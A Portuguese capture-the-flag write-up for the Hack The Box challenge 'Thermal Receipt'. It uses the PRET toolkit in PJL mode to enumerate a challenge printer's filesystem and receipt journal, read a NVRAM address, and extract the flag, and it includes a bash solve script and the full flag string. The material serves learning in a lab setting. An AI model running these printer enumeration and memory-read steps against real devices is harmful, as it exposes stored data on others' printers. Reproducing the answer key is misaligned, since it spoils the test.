# Thermal Receipt — Write-up Completo
## Resolvido por Doz

## Informações do desafio

- **Nome:** Thermal Receipt
- **Categoria:** Printer / Hardware / Misc
- **Dificuldade:** Easy
- **Pontuação:** 975
- **Protocolo explorado:** PJL — Printer Job Language
- **Ferramenta principal:** PRET — Printer Exploitation Toolkit
- **Alvo utilizado:** `154.57.164.82:30885`

> O endereço e a porta são temporários e mudam sempre que a instância do desafio é reiniciada.

---

## Descrição original

```text
Keir and his undercity runners recovered a forgotten Eastreach ration kiosk after Damas Marrowcairn sent clerks to strip the counting terminal and burn the paper ledger. They missed the networked thermal receipt printer bolted beneath the counter. This is a printer challenge, not a kiosk or web-application challenge: the exposed service speaks a raw printer protocol, so PRET in PJL mode is the intended starting point. If the printer still remembers the right transaction, it may hold the authorization token needed to move supplies through Crownspire sealed checkpoints.
```

## Tradução

Keir e seus mensageiros da cidade subterrânea recuperaram um antigo quiosque de distribuição de rações de Eastreach, depois que Damas Marrowcairn enviou funcionários para remover o terminal de contagem e queimar o livro-caixa em papel.

Entretanto, eles esqueceram a impressora térmica de recibos conectada à rede e instalada embaixo do balcão.

Este é um desafio de impressora, e não um desafio de aplicação web ou do próprio quiosque. O serviço exposto utiliza um protocolo bruto de impressão. Portanto, o ponto de partida pretendido é o **PRET em modo PJL**.

Caso a impressora ainda se lembre da transação correta, ela poderá conter o token de autorização necessário para transportar suprimentos pelos checkpoints selados de Crownspire.

---

## Objetivo

Conectar-se ao serviço de impressão, enumerar o sistema de arquivos interno da impressora, localizar o recibo mais recente e recuperar da NVRAM o código de autorização armazenado.

---

## 1. Identificação do serviço

O alvo fornecido pelo HTB foi:

```text
154.57.164.82:30885
```

Podemos verificar se a porta está acessível com:

```bash
nc -vz 154.57.164.82 30885
```

Uma resposta de conexão bem-sucedida confirma que existe um serviço TCP ouvindo nessa porta.

O enunciado já informa que o serviço utiliza um protocolo bruto de impressora e recomenda o uso do PRET em modo PJL.

---

## 2. Preparação do PRET

O PRET pode ser obtido pelo repositório oficial:

```bash
cd ~/Desktop/CTF
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
```

Caso as dependências ainda não estejam instaladas:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install colorama pysnmp
```

Os avisos abaixo podem aparecer em versões recentes do Python:

```text
SyntaxWarning: invalid escape sequence
```

Esses avisos não impedem a execução do PRET e podem ser ignorados para a resolução do desafio.

---

## 3. Conexão em modo PJL

Dentro do diretório do PRET, executamos:

```bash
cd /home/t0x1n/Desktop/CTF/PRET
python3 pret.py 154.57.164.82:30885 pjl
```

A conexão foi estabelecida com sucesso:

```text
Connection to 154.57.164.82:30885 established
Device: RiverGate RG-T80II Thermal Receipt Printer
```

O PRET abriu um shell interativo:

```text
154.57.164.82:30885:/>
```

---

## 4. Enumeração inicial

Primeiramente, identificamos o dispositivo:

```text
id
```

Resultado:

```text
RiverGate RG-T80II Thermal Receipt Printer
```

Em seguida, verificamos o diretório atual:

```text
pwd
```

Resultado:

```text
0:/
```

Isso mostra que estamos no volume interno `0:` da impressora.

### Listagem do diretório raiz

```text
ls
```

Resultado:

```text
d        -   config
d        -   journal
-       97   readme.txt
d        -   spool
```

Foram encontrados os seguintes itens:

- `config/`: configurações do dispositivo;
- `journal/`: diário eletrônico de recibos;
- `readme.txt`: informações sobre o volume;
- `spool/`: área de trabalhos de impressão.

### Verificação do sistema de arquivos

```text
info filesys
```

Resultado:

```text
VOLUME TYPE TOTAL FREE LOCATION
0: TYPE=DIR TOTAL=65536 FREE=49152 LOCATION=FLASH
```

A impressora possui um volume em memória flash identificado como `0:`.

---

## 5. Enumeração recursiva dos arquivos

Para listar todos os arquivos disponíveis, utilizamos:

```text
find
```

Resultado:

```text
/config/
/config/device.txt
/journal/
/journal/last.txt
/journal/receipt_0000.txt
/journal/receipt_0001.txt
/journal/receipt_0002.txt
/journal/receipt_0003.txt
/readme.txt
/spool/
/spool/README.txt
```

O diretório mais interessante é `journal/`, pois contém o histórico de recibos eletrônicos.

---

## 6. Análise dos arquivos informativos

### Arquivo `readme.txt`

```text
cat readme.txt
```

Resultado:

```text
RiverGate RG-T80II raw printer volume.
Electronic journal retention is enabled under 0:/journal.
```

A mensagem confirma que a retenção do diário eletrônico está habilitada em:

```text
0:/journal
```

### Configuração do dispositivo

```text
cat config/device.txt
```

Resultado:

```text
MODEL=RG-T80II
FW=3.18
CMDSET=PJL/PCL/ESC-POS
EJOURNAL=ON
LAST_CLOSED_SLOT=NVRAM:EJ_LAST
```

Pontos importantes:

- o dispositivo aceita `PJL`, `PCL` e `ESC/POS`;
- o diário eletrônico está ativado;
- a referência do último recibo fechado é armazenada na NVRAM.

### Informações da fila de impressão

```text
cat spool/README.txt
```

Resultado:

```text
Active jobs are removed after cut. Closed receipts are retained in 0:/journal.
```

Os trabalhos ativos são apagados após o corte do papel, mas os recibos finalizados continuam armazenados no diário eletrônico.

---

## 7. Identificação do recibo mais recente

O arquivo `journal/last.txt` indica qual foi o último recibo fechado:

```text
cat journal/last.txt
```

Resultado:

```text
receipt_0003.txt
```

Portanto, o arquivo mais importante é:

```text
journal/receipt_0003.txt
```

---

## 8. Leitura dos recibos

Os recibos anteriores continham códigos de autorização comuns.

### Recibo 0000

```text
cat journal/receipt_0000.txt
```

```text
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-05-31 22:10:04
GATE: RIVER-02
CARGO: LAMP OIL
SEAL FEE: 18.50
AUTH CODE: RG-5812-OK
------------------------------
```

### Recibo 0001

```text
cat journal/receipt_0001.txt
```

```text
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-05-31 22:44:19
GATE: MARKET-01
CARGO: MEDICINE
SEAL FEE: 07.20
AUTH CODE: RG-4421-OK
------------------------------
```

### Recibo 0002

```text
cat journal/receipt_0002.txt
```

```text
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:03:51
GATE: HARBOR-04
CARGO: GRAIN SACKS
SEAL FEE: 31.90
AUTH CODE: RG-9014-OK
------------------------------
```

### Recibo 0003

```text
cat journal/receipt_0003.txt
```

Resultado:

```text
EASTREACH RATION KIOSK
------------------------------
DATE: 2026-06-01 00:17:33
GATE: ASH-03
CARGO: BRINE FILTERS
SEAL FEE: 42.10
AUTH CODE: STORED IN NVRAM
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
------------------------------
```

Diferentemente dos recibos anteriores, o último recibo não contém o código diretamente.

Ele informa que o valor está armazenado na NVRAM:

```text
NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
```

Informações importantes:

- **Referência:** `EJ_AUTH_0421`
- **Endereço:** `53264`
- **Comprimento:** `60` bytes

---

## 9. Leitura da NVRAM

O PRET possui o comando `nvram read`, que permite consultar um endereço da memória não volátil da impressora.

Executamos:

```text
nvram read 53264
```

Resultado:

```text
ADDRESS=53264 DATA=72
ASCII="HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}"
```

Apesar do nome sugerir a leitura de um único endereço, o serviço do desafio retornou também a sequência ASCII associada à referência armazenada naquele local.

A flag foi recuperada diretamente da NVRAM.

---

## 10. Extração automática da flag com `grep`

É possível automatizar a conexão, a leitura da NVRAM e a extração da flag em um único comando.

```bash
printf 'nvram read 53264\nexit\n' \
  | python3 pret.py 154.57.164.82:30885 pjl 2>/dev/null \
  | grep -aoE 'HTB\{[^}]+\}'
```

Saída esperada:

```text
HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}
```

### Explicação do comando

```bash
printf 'nvram read 53264\nexit\n'
```

Envia automaticamente dois comandos para o shell do PRET:

1. `nvram read 53264`;
2. `exit`.

```bash
python3 pret.py 154.57.164.82:30885 pjl
```

Conecta ao alvo utilizando o PRET em modo PJL.

```bash
2>/dev/null
```

Oculta os avisos e mensagens enviados para `stderr`, como os `SyntaxWarning` do Python.

```bash
grep -aoE 'HTB\{[^}]+\}'
```

Extrai somente o padrão de flag:

- `-a`: trata a entrada como texto;
- `-o`: imprime apenas o trecho correspondente;
- `-E`: habilita expressões regulares estendidas;
- `HTB\{[^}]+\}`: procura por `HTB{`, seguido de qualquer conteúdo até `}`.

---

## 11. Alternativa salvando a saída em um arquivo

Também é possível registrar toda a sessão utilizando `tee`:

```bash
python3 pret.py 154.57.164.82:30885 pjl | tee pret.log
```

Dentro do PRET:

```text
nvram read 53264
exit
```

Depois, extraímos a flag do log:

```bash
grep -aoE 'HTB\{[^}]+\}' pret.log
```

---

## 12. Erro no comando `nvram dump`

Ao executar:

```text
nvram dump
```

O PRET tentou criar o arquivo:

```text
nvram/154.57.164.82:30885
```

Porém ocorreu o erro:

```text
TypeError: a bytes-like object is required, not 'str'
```

Isso acontece porque essa versão antiga do PRET possui incompatibilidade com versões recentes do Python, neste caso o Python 3.13.

O código abre o arquivo em modo binário:

```python
'ab+'
```

Mas tenta escrever uma string Python em vez de bytes.

Como consequência, o arquivo foi criado vazio:

```bash
find nvram -type f -ls
```

Resultado semelhante a:

```text
0 Jul 26 03:36 nvram/154.57.164.82:30885
```

Portanto, os comandos abaixo não retornariam nada nesse arquivo vazio:

```bash
strings -a nvram/* | grep -oE 'HTB\{[^}]+\}'
```

```bash
grep -aEo 'HTB\{[^}]+\}' nvram/*
```

Esse erro não bloqueou a resolução, pois `nvram read 53264` já exibiu diretamente o conteúdo ASCII contendo a flag.

---

## 13. Possível correção do PRET para Python 3.13

Essa correção não é necessária para concluir o desafio, mas pode ser utilizada para fazer o `nvram dump` funcionar.

Abra o arquivo:

```bash
nano /home/t0x1n/Desktop/CTF/PRET/helper.py
```

Localize a função responsável pela gravação, próxima da linha indicada no traceback:

```python
f.write(data)
```

Substitua por uma conversão condicional:

```python
if isinstance(data, str):
    data = data.encode()

f.write(data)
```

Uma forma rápida de criar um backup antes da alteração é:

```bash
cp helper.py helper.py.bak
```

Depois, execute novamente:

```bash
python3 pret.py 154.57.164.82:30885 pjl
```

E no shell:

```text
nvram dump
```

Entretanto, para este desafio, a alteração é opcional.

---

## 14. Comando completo de resolução

Depois de identificar o endereço `53264`, toda a exploração pode ser resumida em:

```bash
cd /home/t0x1n/Desktop/CTF/PRET

printf 'nvram read 53264\nexit\n' \
  | python3 pret.py 154.57.164.82:30885 pjl 2>/dev/null \
  | grep -aoE 'HTB\{[^}]+\}'
```

---

## 15. Script Bash automatizado

Podemos criar um script que recebe `IP:PORT`, conecta ao serviço e extrai a flag automaticamente.

### Criação com `cat <<'EOF'`

```bash
cat > solve.sh <<'EOF'
#!/usr/bin/env bash

set -euo pipefail

TARGET="${1:-}"

if [[ -z "$TARGET" ]]; then
    echo "Uso: $0 IP:PORT"
    echo "Exemplo: $0 154.57.164.82:30885"
    exit 1
fi

if [[ ! "$TARGET" =~ ^[^:]+:[0-9]+$ ]]; then
    echo "[-] Alvo inválido. Utilize o formato IP:PORT."
    exit 1
fi

PRET_DIR="/home/t0x1n/Desktop/CTF/PRET"
PRET_SCRIPT="$PRET_DIR/pret.py"
NVRAM_ADDR="53264"

if [[ ! -f "$PRET_SCRIPT" ]]; then
    echo "[-] PRET não encontrado em: $PRET_SCRIPT"
    exit 1
fi

echo "[*] Alvo: $TARGET"
echo "[*] Lendo a NVRAM no endereço $NVRAM_ADDR..."

echo -e "nvram read ${NVRAM_ADDR}\nexit" \
    | python3 "$PRET_SCRIPT" "$TARGET" pjl 2>/dev/null \
    | grep -aoE 'HTB\{[^}]+\}'
EOF
```

### Permissão de execução

```bash
chmod +x solve.sh
```

### Execução

```bash
./solve.sh 154.57.164.82:30885
```

Saída:

```text
[*] Alvo: 154.57.164.82:30885
[*] Lendo a NVRAM no endereço 53264...
HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}
```

### Explicação do `cat <<'EOF'`

O bloco:

```bash
cat > solve.sh <<'EOF'
...
EOF
```

é um **heredoc**.

Ele envia todo o conteúdo localizado entre as duas marcações `EOF` para o arquivo `solve.sh`.

As aspas simples em:

```bash
<<'EOF'
```

impedem que variáveis como `$TARGET` sejam expandidas durante a criação do arquivo. Assim, elas permanecem intactas dentro do script e só são avaliadas quando o script for executado.

---

## 16. Fluxo completo da exploração

1. O enunciado informa que o alvo é uma impressora e recomenda PRET/PJL.
2. O PRET identifica o dispositivo como uma impressora térmica RiverGate RG-T80II.
3. O comando `find` revela o diretório `journal/`.
4. O arquivo `journal/last.txt` aponta para `receipt_0003.txt`.
5. O recibo informa que o código está na NVRAM.
6. O recibo fornece o endereço `53264` e o tamanho de `60` bytes.
7. O comando `nvram read 53264` retorna a sequência ASCII.
8. O padrão `HTB{...}` é extraído com `grep`.

---

## Flag

```text
HTB{th3rm4l_j0urn4l_r3c4ll_178c069fc121c5d18485283ab4334f71}
```

---

## Conclusão

O desafio demonstrou como impressoras de rede podem armazenar informações sensíveis em áreas normalmente ignoradas, como diários eletrônicos, sistemas de arquivos internos e memória NVRAM.

Embora o terminal principal do quiosque e o livro-caixa em papel tenham sido removidos, a impressora continuou retendo os recibos finalizados. O último recibo continha uma referência direta ao endereço da NVRAM no qual o código de autorização estava armazenado.

A exploração foi realizada utilizando o PRET em modo PJL, sem necessidade de explorar uma aplicação web. A flag foi recuperada pela leitura do endereço `53264` e extraída automaticamente com uma expressão regular utilizando `grep`.
